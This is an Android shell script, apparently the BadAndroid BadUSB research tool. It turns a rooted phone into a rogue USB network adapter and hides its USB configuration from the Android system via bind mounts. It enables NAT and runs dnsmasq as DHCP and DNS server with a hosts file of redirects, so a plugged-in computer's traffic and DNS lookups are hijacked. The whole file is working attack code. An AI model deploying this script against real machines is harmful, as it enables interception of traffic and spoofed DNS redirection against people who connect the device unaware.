#!/system/bin/sh

TMPDIR=/data/local/tmp
UPSTREAM_NS=8.8.8.8

# Check required tools
if ! busybox ls > /dev/null;then
    echo No busybox found
    exit 1
fi
if ! dnsmasq -v > /dev/null;then
    echo No dnsmasq found
    exit 1
fi
if ! busybox test -e /sys/class/android_usb/android0/f_rndis;then
    echo "Device doesn't support RNDIS"
    exit 1
fi
if ! iptables -V;then
    echo iptables not found
    exit 1
fi

BADANDROID_DIR=$TMPDIR/badandroid

if ! test -e /data/local/tmp/hosts;then
    echo "Please add a hosts file for your redirects to /data/local/tmp/hosts"
    exit 1
fi

if test -e $BADANDROID_DIR;then
    sh /data/local/tmp/cleanup.sh
fi

mkdir $BADANDROID_DIR
chmod 755 $BADANDROID_DIR
cd $BADANDROID_DIR
# Use mount --bind to hide the contents of /sys/class/android_usb and /sys/devices/virtual/android_usb so that the android system can't reconfigure the USB interface any more (until the next reboot)
mkdir $BADANDROID_DIR/empty
mkdir $BADANDROID_DIR/sys_class_android_usb
mkdir $BADANDROID_DIR/sys_devices_virtual_android_usb
busybox mount --bind /sys/class/android_usb/ $BADANDROID_DIR/sys_class_android_usb/
busybox mount --bind /sys/devices/virtual/android_usb/ $BADANDROID_DIR/sys_devices_virtual_android_usb/
busybox mount --bind $BADANDROID_DIR/empty/ /sys/class/android_usb/
busybox mount --bind $BADANDROID_DIR/empty/ /sys/devices/virtual/android_usb/

# We have to disable the usb interface before reconfiguring it
echo 0 > sys_devices_virtual_android_usb/android0/enable
echo rndis > sys_devices_virtual_android_usb/android0/functions
echo 224 > sys_devices_virtual_android_usb/android0/bDeviceClass
echo 6863 > sys_devices_virtual_android_usb/android0/idProduct
echo 1 > sys_devices_virtual_android_usb/android0/enable

# Check whether it has applied the changes
cat sys_devices_virtual_android_usb/android0/functions
cat sys_devices_virtual_android_usb/android0/enable
INTERFACE=rndis0

# Wait until the interface actually exists
while ! busybox ifconfig $INTERFACE > /dev/null 2>&1;do
    echo Waiting for interface $INTERFACE
    busybox sleep 1
done

# Configure interface, firewall and packet forwarding
busybox ifconfig $INTERFACE inet 192.168.100.1 netmask 255.255.255.0 up
iptables -I FORWARD -i $INTERFACE -j ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

chmod 644 /data/local/tmp/hosts
# Start dnsmasq
dnsmasq -H /data/local/tmp/hosts -i $INTERFACE -R -S $UPSTREAM_NS -F 192.168.100.100,192.168.100.200 -x $BADANDROID_DIR/dnsmasq.pid

